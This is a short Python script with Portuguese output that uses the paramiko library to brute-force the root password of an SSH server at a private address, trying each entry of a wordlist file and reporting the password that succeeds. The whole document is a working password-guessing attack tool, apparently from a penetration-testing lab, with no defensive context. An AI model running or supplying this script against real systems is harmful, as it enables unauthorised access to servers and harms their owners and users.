#!/usr/bin/python3

import paramiko

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open("wl-ssh.txt")
for palavra in f.readlines():
	senha = palavra.strip()

	try:
		ssh.connect("172.16.1.5", username="root", password=senha)
	except paramiko.ssh_exception.AuthenticationException:
		print ("Testando com:", senha)
	else:
		print ("[+] Senha encontrada --->", senha)
		break

ssh.close()